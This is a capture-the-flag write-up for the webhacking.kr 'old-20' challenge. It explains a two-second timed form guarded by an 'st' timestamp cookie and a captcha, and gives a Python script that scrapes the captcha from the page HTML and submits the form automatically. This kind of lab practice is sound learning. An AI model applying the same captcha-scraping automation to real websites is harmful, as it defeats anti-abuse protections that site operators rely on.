[old-20](https://webhacking.kr/challenge/code-4/) | 200 | Scripting

Howdy there, welcome and welcome back for another webhacking.kr web-based CTF style challenge. As for today's challenge, we are going to look at some simple scripting.

![question](/assets/images/webhackingkr/2020-09-05-old-20/1.png)

For your information, you have 2 seconds to complete the form with a dynamic captcha verification. So, how does the system knew it was 2 seconds? Look at the **st** cookie parameter that records the current timestamp. However, changing the value does not yield any good results. The only way to solve the challenge is by good-o-scripting.

```python
import requests
from bs4 import BeautifulSoup

#Remember to change the challCookie according to your session id
challCookie = ''
cookies = {'PHPSESSID':challCookie}
url = 'https://webhacking.kr/challenge/code-4/'

#Obtain the page information
r = requests.get(url, cookies=cookies)
response = r.text
soup = BeautifulSoup(response, 'html.parser')

#Obtain the 'st' cookie
for c in r.cookies:
        st = c.name
        st_val = c.value

#extract the captcha
input_lst = soup.find_all('input')
captcha = str(input_lst[3])
captcha = captcha[83:93]

#submit the request
data = {'id':'1', 'cmt':'1', 'captcha':captcha}
cookies = {'PHPSESSID':challCookie, 'st':st_val}
response = requests.post(url, data=data, cookies=cookies)

print(response.text)
```

Be sure to install the [BeautifulSoup](https://www.crummy.com/software/BeautifulSoup/bs4/doc/#installing-beautiful-soup) and change the challCookie value.
